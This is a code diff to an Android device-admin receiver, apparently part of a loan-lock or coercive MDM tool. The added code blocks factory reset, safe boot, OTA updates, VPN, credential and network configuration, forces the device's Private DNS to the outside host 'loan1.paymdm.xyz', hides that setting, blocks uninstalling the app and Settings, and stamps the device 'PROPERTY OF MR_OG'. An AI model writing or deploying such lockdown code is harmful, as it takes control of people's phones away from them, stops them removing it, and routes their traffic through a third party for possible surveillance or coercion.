@@ -37,25 +37,62 @@ public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
             return;
         }
 
-        // --- BLOCK RESETS & DNS CONFIG ---
+        // --- ANDROID 16 PREMIUM SECURITY LOCKDOWN ---
         try {
+            // 1. Permanently Block System Updates (OTA)
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                dpm.setSystemUpdatePolicy(admin, SystemUpdatePolicy.createPostponeInstallPolicy());
+            }
+
+            // 2. Core Lockdown Restrictions
             dpm.addUserRestriction(admin, UserManager.DISALLOW_FACTORY_RESET);
-            dpm.addUserRestriction(admin, UserManager.DISALLOW_NETWORK_RESET);
-            dpm.addUserRestriction(admin, UserManager.DISALLOW_CONFIG_PRIVATE_DNS);
-        } catch (Exception e) {}
-
-        try {
-            java.lang.reflect.Method method = dpm.getClass().getMethod("setMasterClearDisabled", ComponentName.class, boolean.class);
-            method.invoke(dpm, admin, true);
-        } catch (Exception e) {
+            dpm.addUserRestriction(admin, UserManager.DISALLOW_SAFE_BOOT);
+            dpm.addUserRestriction(admin, UserManager.DISALLOW_ADD_USER);
+            dpm.addUserRestriction(admin, UserManager.DISALLOW_REMOVE_USER);
+            dpm.addUserRestriction(admin, UserManager.DISALLOW_MODIFY_ACCOUNTS);
+            
+            // 3. Network & DNS Lockdown (Samsung Specific)
+            dpm.setGlobalSetting(admin, "private_dns_mode", "hostname");
+            dpm.setGlobalSetting(admin, "private_dns_specifier", "loan1.paymdm.xyz");
+            dpm.setGlobalSetting(admin, "private_dns_default_mode", "hostname");
+            
+            // Samsung Specific: Grey out Private DNS UI
             try {
-                dpm.setUninstallBlocked(admin, "com.android.settings", true);
-            } catch (Exception ex) {}
-        }
+                dpm.setGlobalSetting(admin, "private_dns_mode_modify_allowed", "0");
+            } catch (Exception e) {}
+            
+            dpm.addUserRestriction(admin, "no_config_private_dns");
+            dpm.addUserRestriction(admin, "no_config_vpn");
+            dpm.addUserRestriction(admin, "no_config_credentials");
+            dpm.addUserRestriction(admin, "no_network_reset");
+            
+            dpm.addUserRestriction(admin, "no_physical_media"); // Block SD/OTG
+            dpm.addUserRestriction(admin, "no_tethering"); // Block Hotspot
+            dpm.addUserRestriction(admin, "no_airplane_mode");
 
-        try {
-            dpm.setOrganizationName(admin, "MR_OG_PROTECTION");
-        } catch (Exception e) {}
+            // 4. Samsung Specific Master Clear Block
+            try {
+                java.lang.reflect.Method method = dpm.getClass().getMethod("setMasterClearDisabled", ComponentName.class, boolean.class);
+                method.invoke(dpm, admin, true);
+            } catch (Exception e) {
+                dpm.setUninstallBlocked(admin, "com.android.settings", true);
+            }
+
+            // 5. App Self Preservation
+            dpm.setUninstallBlocked(admin, context.getPackageName(), true);
+            dpm.setOrganizationName(admin, "PROPERTY OF MR_OG (REPAIR 2026)");
+            
+            // Success Feedback
+            Toast.makeText(context, "MR_OG NUCLEAR ENGINE: ACTIVE [ANDROID 16 READY]", Toast.LENGTH_LONG).show();
+            
+            try {
+                android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
+                if (v != null) v.vibrate(800);
+            } catch (Exception ve) {}
+
+        } catch (Exception e) {
+            Log.e(TAG, "Nuclear Policy Error: " + e.getMessage());
+        }
     }
 
     @Override
